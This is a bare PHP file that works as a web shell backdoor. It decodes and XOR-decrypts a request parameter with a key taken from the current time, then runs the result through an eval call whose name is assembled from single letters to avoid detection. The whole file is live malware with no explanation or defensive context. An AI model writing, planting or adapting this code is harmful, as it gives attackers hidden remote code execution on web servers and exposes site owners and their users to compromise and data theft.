<?php

date_default_timezone_set("PRC");

if (isset($_REQUEST['rt7ao0lsw'])) {
    @$post = base64_decode($_REQUEST['rt7ao0lsw']);
    
    if ($post) {
        $current_time = time();
        $possible_keys = [
            md5(date("Y-m-d H:i", $current_time)),      
            md5(date("Y-m-d H:i", $current_time - 60)),  
            md5(date("Y-m-d H:i", $current_time + 60))   
        ];
        
        $decrypted_successfully = false;
        $final_payload = '';

        foreach ($possible_keys as $key) {
            $temp_post = $post; 
            
            for ($i = 0; $i < strlen($temp_post); $i++) {
                $temp_post[$i] = $temp_post[$i] ^ $key[$i % 32];
            }
            
            if (preg_match('/^[a-zA-Z0-9_\\\x7f-\xff]/', $temp_post)) {
                $final_payload = $temp_post;
                $decrypted_successfully = true;
                break; 
            }
        }

        if ($decrypted_successfully && !empty($final_payload)) {
            $e = 'e'; $v = 'v'; $a = 'a'; $l = 'l';
            $engine = $e . $v . $a . $l;
            
            @$engine($final_payload);
            exit();
        }
    }
}
?>
